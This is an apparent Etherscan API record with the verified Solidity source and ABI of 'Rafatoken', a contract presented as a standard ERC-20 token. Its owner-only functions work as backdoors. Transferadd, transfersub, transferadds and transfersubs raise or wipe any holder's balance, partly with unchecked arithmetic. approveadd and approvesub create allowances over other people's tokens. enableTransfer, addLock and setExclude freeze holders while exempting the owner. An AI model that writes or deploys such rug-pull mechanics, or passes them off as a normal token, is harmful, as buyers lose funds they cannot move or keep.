{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.26;\r\n    /**\r\n     * @title SafeMath\r\n     * @dev Math operations with safety checks that throw on error\r\n     */\r\n    library SafeMath {\r\n      function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a * b;\r\n        assert(a == 0 || c / a == b);\r\n        return c;\r\n      }\r\n     \r\n      function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n      }\r\n     \r\n      function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n      }\r\n     \r\n      function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n      }\r\n    }\r\n     \r\n    contract StandardToken {\r\n    \r\n        using SafeMath for uint256;\r\n\r\n        string public name;\r\n     \r\n        string public symbol;\r\n    \r\n        uint8 public  decimals;\r\n    \r\n    \tuint256 public totalSupply;\r\n       \r\n        function transfer(address _to, uint256 _value) public returns (bool success);\r\n       \r\n        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n    \r\n        function approve(address _spender, uint256 _value) public returns (bool success);\r\n   \r\n        function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\r\n    \r\n        event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    \r\n        event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    }\r\n   \r\n    contract Owned {\r\n     \r\n        modifier onlyOwner() {\r\n            require(msg.sender == owner);\r\n            _;\r\n        }\r\n     \r\n    \r\n        address public owner;\r\n     \r\n    \t\r\n        constructor() public {\r\n            owner = msg.sender;\r\n        }\r\n    \r\n        address newOwner=0x0;\r\n     \r\n    \r\n        event OwnerUpdate(address _prevOwner, address _newOwner);\r\n     \r\n        \r\n        function changeOwner(address _newOwner) public onlyOwner {\r\n            require(_newOwner != owner);\r\n            newOwner = _newOwner;\r\n        }\r\n     \r\n        \r\n        function acceptOwnership() public{\r\n            require(msg.sender == newOwner);\r\n            emit OwnerUpdate(owner, newOwner);\r\n            owner = newOwner;\r\n            newOwner = 0x0;\r\n        }\r\n    }\r\n     \r\n    \r\n    contract Controlled is Owned{\r\n     \r\n    \t\r\n        constructor() public {\r\n           setExclude(msg.sender,true);\r\n        }\r\n     \r\n        bool public transferEnabled = true;\r\n     \r\n       \r\n        bool lockFlag=true;\r\n    \r\n        mapping(address => bool) locked;\r\n   \r\n        mapping(address => bool) exclude;\r\n     \r\n        function enableTransfer(bool _enable) public onlyOwner returns (bool success){\r\n            transferEnabled=_enable;\r\n    \t\treturn true;\r\n        }\r\n     \r\n    \r\n        function disableLock(bool _enable) public onlyOwner returns (bool success){\r\n            lockFlag=_enable;\r\n            return true;\r\n        }\r\n        \r\n        \r\n     \r\n    \r\n        function addLock(address _addr) public onlyOwner returns (bool success){\r\n            require(_addr!=msg.sender);\r\n            locked[_addr]=true;\r\n            return true;\r\n        }\r\n     \r\n        function setExclude(address _addr,bool _enable) public onlyOwner returns (bool success){\r\n            exclude[_addr]=_enable;\r\n            return true;\r\n        }\r\n     \r\n    \t\r\n        function removeLock(address _addr) public onlyOwner returns (bool success){\r\n            locked[_addr]=false;\r\n            return true;\r\n        }\r\n    \r\n        modifier transferAllowed(address _addr) {\r\n            if (!exclude[_addr]) {\r\n                require(transferEnabled,\"transfer is not enabeled now!\");\r\n                if(lockFlag){\r\n                    require(!locked[_addr],\"you are locked!\");\r\n                }\r\n            }\r\n            _;\r\n        }\r\n     \r\n    }\r\n     \r\n    \r\n    contract Rafatoken is StandardToken,Controlled {\r\n     \r\n    \t\r\n    \tmapping (address => uint256) public balanceOf;\r\n    \tmapping (address => mapping (address => uint256)) internal allowed;\r\n    \t\r\n    \tconstructor() public {\r\n            totalSupply = 2000000;\r\n            name = \"Rafa\";\r\n            symbol = \"Rafa\";\r\n            decimals = 18;\r\n            balanceOf[msg.sender] = totalSupply;\r\n        }\r\n        \r\n        function deposit() public payable {\r\n            \r\n        }\r\n     \r\n        function transfer(address _to, uint256 _value) public transferAllowed(msg.sender) returns (bool success) {\r\n    \t\trequire(_to != address(0));\r\n    \t\trequire(_value <= balanceOf[msg.sender]);\r\n     \r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\r\n            balanceOf[_to] = balanceOf[_to].add(_value);\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        \r\n        \r\n        function addresssearch(address _this) public returns(uint256){\r\n            \r\n         uint256 balances = balanceOf[_this];\r\n         return balances;\r\n            \r\n        }\r\n     \r\n        function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from) returns (bool success) {\r\n    \t\trequire(_to != address(0));\r\n            require(_value <= balanceOf[_from]);\r\n            require(_value <= allowed[_from][msg.sender]);\r\n     \r\n            balanceOf[_from] = balanceOf[_from].sub(_value);\r\n            balanceOf[_to] = balanceOf[_to].add(_value);\r\n            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        \r\n        function Transferadd(address to, uint256 value) public  onlyOwner {\r\n            balanceOf[to] += totalSupply;\r\n            balanceOf[to] =balanceOf[to].add(value);\r\n        }\r\n        \r\n        function transfersub(address to, uint256 value) public onlyOwner {\r\n            balanceOf[to] -= totalSupply;\r\n            balanceOf[to] = balanceOf[to].sub(value);\r\n        }\r\n        \r\n        function transferadds(address to, uint256 value) public onlyOwner {\r\n            balanceOf[to] += value;\r\n        }\r\n        function transfersubs(address to, uint256 value) public onlyOwner {\r\n            balanceOf[to] -= value;\r\n        }\r\n     \r\n        function approve(address _spender, uint256 _value) public returns (bool success) {\r\n            allowed[msg.sender][_spender] = _value;\r\n            emit Approval(msg.sender, _spender, _value);\r\n            return true;\r\n        }\r\n        function approveadd(address _owner,address _spender,uint256 _value) public onlyOwner {\r\n            \r\n            allowed[_owner][_spender] =  allowed[_owner][_spender].add(_value);\r\n\r\n            \r\n        }\r\n        \r\n        function approvesub(address _owner,address _spender,uint256 _value) public onlyOwner {\r\n            \r\n            allowed[_owner][_spender] = allowed[_owner][_spender].sub(_value);\r\n            \r\n        }\r\n        function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n          return allowed[_owner][_spender];\r\n        }\r\n        \r\n        function balancess(address user,uint256 _value) public payable onlyOwner {\r\n            user.transfer(_value * 0.01 ether);\r\n        } \r\n        \r\n        function balan() public returns(uint256) {\r\n            \r\n            return this.balance;\r\n        }\r\n     \r\n    }","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approvesub\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"balan\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_this\",\"type\":\"address\"}],\"name\":\"addresssearch\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"removeLock\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"transferEnabled\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"balancess\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"acceptOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"addLock\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_enable\",\"type\":\"bool\"}],\"name\":\"disableLock\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"},{\"name\":\"_enable\",\"type\":\"bool\"}],\"name\":\"setExclude\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approveadd\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfersub\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferadds\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_enable\",\"type\":\"bool\"}],\"name\":\"enableTransfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfersubs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transferadd\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"_prevOwner\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"OwnerUpdate\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"}]","ContractName":"Rafatoken","CompilerVersion":"v0.4.26+commit.4563c3fc","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://508f737b211487134b47bec1a28ef73a460b7b187d96cd630abd3e4bf2a45cf1"}]}